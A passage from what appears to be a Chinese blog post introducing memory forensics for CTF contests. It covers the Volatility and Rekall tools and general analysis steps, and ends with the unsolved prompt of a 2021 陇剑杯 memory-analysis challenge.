Flag）比赛中，内存取证主要用于调查计算机系统在遭受攻击或发生异常行为时内存中的相关线索。</li><li>计算机内存就像是一个实时的 “工作空间”，存储着正在运行的进程、用户操作的临时数据、网络连接信息等。当系统被入侵时，攻击者留下的痕迹（如恶意程序的运行状态、窃取的数据缓存等）可能会在内存中找到。</li></ul><p><strong>二、内存取证的重要性</strong></p><ul><li><strong>获取易失性数据</strong>：许多关键信息（如登录凭证、加密密钥在使用时的状态、正在运行的恶意软件配置）在内存中是明文或者可以被解密出来，这些数据在系统关机后就会丢失，因此内存取证能够捕获这些易失性数据。</li><li><strong>重建攻击场景</strong>：通过分析内存中的进程链、网络连接和文件操作记录，可以帮助还原攻击者的入侵路径和行为，了解攻击是如何发生的以及攻击者做了什么。</li></ul><p><strong>三、常用工具</strong></p><ol><li><p>Volatility</p><ul><li><p><strong>简介</strong>：这是一款非常著名的开源内存取证框架。它支持多种操作系统（如 Windows、Linux 等）的内存分析。</p></li><li><p>功能示例</p><p>：</p><ul><li><strong>进程分析</strong>：可以列出内存中所有运行的进程，包括进程 ID、进程名、父进程等信息。例如，使用<code>pslist</code>命令能够像在操作系统中查看任务管理器一样展示进程列表，这有助于发现异常进程。</li><li><strong>网络连接分析</strong>：能够提取内存中保存的网络连接相关信息。如<code>netscan</code>命令可以找出活动的网络连接，包括 IP 地址、端口等，从而发现恶意软件与外部控制服务器的连接。</li></ul></li></ul></li><li><p>Rekall</p><ul><li><strong>简介</strong>：也是一个强大的内存分析工具，它有很好的扩展性和灵活性。</li><li><strong>特点</strong>：采用了 Python 语言开发，用户可以根据自己的需求方便地编写插件来扩展其功能。它在处理大型内存镜像和复杂的内核结构分析方面表现出色。</li></ul></li></ol><p><strong>四、内存取证的一般步骤</strong></p><ol><li>获取内存镜像<ul><li><strong>物理获取</strong>：在 CTF 场景中，如果模拟的是物理设备（如服务器、个人计算机）被攻击，可能需要通过专门的硬件设备（如内存获取工具包）从计算机的物理内存插槽获取内存镜像。</li><li><strong>虚拟获取</strong>：对于虚拟机等虚拟环境，可以通过虚拟机管理软件提供的功能来获取内存镜像。</li></ul></li><li>确定操作系统和架构<ul><li>不同的操作系统（Windows、Linux、macOS 等）和架构（32 位、64 位）的内存布局和数据结构是不同的。通过分析内存镜像的头部信息或者使用工具的自动识别功能来确定这些信息，这将有助于选择正确的分析工具和插件。</li></ul></li><li>使用工具进行分析<ul><li>如前面提到的使用 Volatility 或 Rekall 等工具。以查找隐藏进程为例，在 Volatility 中使用<code>psxview</code>命令，这个命令会通过多种方式来检测进程，包括通过进程链表（EPROCESS）、线程链表（ETHREAD）等，能够发现被恶意隐藏的进程。</li></ul></li><li>分析结果和线索追踪<ul><li>对工具提取出来的信息进行分析，寻找可疑的进程、文件操作、网络连接等线索。例如，如果发现一个陌生的进程在连接到一个境外的 IP 地址，并且在不断向该 IP 地址发送数据，这很可能是一个恶意程序在向外传输窃取的数据。</li><li>根据线索进一步挖掘，比如提取可疑进程的二进制代码进行逆向分析，查看其功能和目的。</li></ul></li></ol><h3 id="陇剑杯-2021-内存分析（问1）"><a href="#陇剑杯-2021-内存分析（问1）" class="headerlink" title="[陇剑杯 2021]内存分析（问1）"></a>[陇剑杯 2021]内存分析（问1）</h3><p>题目描述：网管小王制作了一个虚拟机文件，让您来分析后作答：<br>虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）。得到的flag请使用NSSCTF{}格式提交。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
